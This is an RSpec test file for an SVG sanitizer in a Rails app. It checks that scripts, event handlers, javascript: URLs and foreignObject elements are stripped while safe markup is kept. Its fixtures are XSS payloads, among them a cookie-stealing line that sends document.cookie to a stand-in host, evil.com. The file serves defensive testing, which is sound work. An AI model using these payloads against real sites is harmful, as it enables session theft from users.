require 'rails_helper'

RSpec.describe SvgSanitizer do
  describe '.sanitize' do
    context 'with clean SVG' do
      let(:clean_svg) do
        <<~SVG
          <?xml version="1.0" encoding="UTF-8"?>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
            <rect x="10" y="10" width="80" height="80" fill="#4a90d9"/>
            <circle cx="50" cy="50" r="25" fill="#ffffff"/>
          </svg>
        SVG
      end

      it 'returns SVG unchanged' do
        result = described_class.sanitize(clean_svg)
        expect(result).to eq(clean_svg)
      end
    end

    context 'with script tags' do
      let(:malicious_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg">
            <script type="text/javascript">alert('XSS');</script>
            <rect fill="#ff0000"/>
          </svg>
        SVG
      end

      it 'removes script tags and their contents' do
        result = described_class.sanitize(malicious_svg)
        expect(result).not_to include('<script')
        expect(result).not_to include('alert')
        expect(result).not_to include('</script>')
      end

      it 'preserves non-script content' do
        result = described_class.sanitize(malicious_svg)
        expect(result).to include('<rect fill="#ff0000"/>')
      end
    end

    context 'with CDATA script blocks' do
      let(:cdata_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg">
            <script type="text/javascript"><![CDATA[
              document.cookie = 'stolen';
            ]]></script>
            <rect fill="#ff0000"/>
          </svg>
        SVG
      end

      it 'removes CDATA script blocks' do
        result = described_class.sanitize(cdata_svg)
        expect(result).not_to include('<script')
        expect(result).not_to include('CDATA')
        expect(result).not_to include('document.cookie')
      end
    end

    context 'with event handler attributes' do
      let(:event_handler_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
            <rect onclick="stealData()" fill="#ff0000"/>
            <circle onmouseover="badStuff()" fill="#fff"/>
          </svg>
        SVG
      end

      it 'removes onload attribute' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).not_to include('onload')
      end

      it 'removes onclick attribute' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).not_to include('onclick')
      end

      it 'removes onmouseover attribute' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).not_to include('onmouseover')
      end

      it 'preserves non-event attributes' do
        result = described_class.sanitize(event_handler_svg)
        expect(result).to include('fill="#ff0000"')
        expect(result).to include('fill="#fff"')
      end
    end

    context 'with various event handler variations' do
      it 'removes onerror attribute' do
        svg = '<svg><image onerror="evil()" src="x"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onerror')
      end

      it 'removes onfocus attribute' do
        svg = '<svg><input onfocus="evil()"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onfocus')
      end

      it 'removes onbegin attribute' do
        svg = '<svg><animate onbegin="evil()"/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onbegin')
      end

      it 'handles single-quoted event handlers' do
        svg = "<svg onload='alert(1)'><rect/></svg>"
        result = described_class.sanitize(svg)
        expect(result).not_to include('onload')
      end

      it 'handles unquoted event handlers' do
        svg = '<svg onload=alert(1)><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to include('onload')
      end
    end

    context 'with javascript: URLs' do
      let(:javascript_url_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <a href="javascript:alert('XSS')">
              <rect fill="#ff0000"/>
            </a>
          </svg>
        SVG
      end

      it 'removes javascript: from href' do
        result = described_class.sanitize(javascript_url_svg)
        expect(result).not_to include('javascript:')
      end

      it 'preserves the href attribute structure' do
        result = described_class.sanitize(javascript_url_svg)
        # The href attribute should still exist but be empty
        expect(result).to match(/href\s*=\s*["']/)
      end
    end

    context 'with xlink:href javascript URLs' do
      let(:xlink_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <a xlink:href="javascript:document.location='http://evil.com'">
              <rect fill="#ff0000"/>
            </a>
          </svg>
        SVG
      end

      it 'removes javascript: from xlink:href' do
        result = described_class.sanitize(xlink_svg)
        expect(result).not_to include('javascript:')
      end
    end

    context 'with foreignObject elements' do
      let(:foreign_object_svg) do
        <<~SVG
          <svg xmlns="http://www.w3.org/2000/svg">
            <foreignObject>
              <div xmlns="http://www.w3.org/1999/xhtml">
                <script>alert('XSS')</script>
              </div>
            </foreignObject>
            <rect fill="#ff0000"/>
          </svg>
        SVG
      end

      it 'removes foreignObject elements' do
        result = described_class.sanitize(foreign_object_svg)
        expect(result).not_to include('<foreignObject')
        expect(result).not_to include('</foreignObject>')
      end

      it 'preserves other elements' do
        result = described_class.sanitize(foreign_object_svg)
        expect(result).to include('<rect fill="#ff0000"/>')
      end
    end

    context 'with blank content' do
      it 'returns blank string as-is' do
        expect(described_class.sanitize('')).to eq('')
      end

      it 'returns nil as-is' do
        expect(described_class.sanitize(nil)).to be_nil
      end
    end

    context 'with complex malicious SVG' do
      let(:complex_malicious_svg) do
        <<~SVG
          <?xml version="1.0" encoding="UTF-8"?>
          <svg xmlns="http://www.w3.org/2000/svg" onload="init()">
            <script>
              function init() {
                new Image().src = 'http://evil.com/steal?cookie=' + document.cookie;
              }
            </script>
            <a href="javascript:alert(document.domain)">
              <rect x="10" y="10" width="80" height="80" fill="#ff0000" onclick="attack()"/>
            </a>
            <foreignObject>
              <body xmlns="http://www.w3.org/1999/xhtml" onload="moreEvil()">
                <script>stealMore();</script>
              </body>
            </foreignObject>
            <circle cx="50" cy="50" r="25" fill="#ffffff"/>
          </svg>
        SVG
      end

      it 'removes all malicious content' do
        result = described_class.sanitize(complex_malicious_svg)

        expect(result).not_to include('<script')
        expect(result).not_to include('onload')
        expect(result).not_to include('onclick')
        expect(result).not_to include('javascript:')
        expect(result).not_to include('<foreignObject')
      end

      it 'preserves safe content' do
        result = described_class.sanitize(complex_malicious_svg)

        expect(result).to include('<?xml version="1.0" encoding="UTF-8"?>')
        expect(result).to include('<svg xmlns="http://www.w3.org/2000/svg"')
        expect(result).to include('x="10"')
        expect(result).to include('fill="#ff0000"')
        expect(result).to include('<circle cx="50" cy="50" r="25" fill="#ffffff"/>')
      end
    end

    context 'case sensitivity' do
      it 'removes SCRIPT tags (uppercase)' do
        svg = '<svg><SCRIPT>alert(1)</SCRIPT><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to match(/<script/i)
      end

      it 'removes OnLoad (mixed case)' do
        svg = '<svg OnLoad="evil()"><rect/></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to match(/onload/i)
      end

      it 'removes JAVASCRIPT: (uppercase)' do
        svg = '<svg><a href="JAVASCRIPT:evil()"><rect/></a></svg>'
        result = described_class.sanitize(svg)
        expect(result).not_to match(/javascript:/i)
      end
    end
  end
end
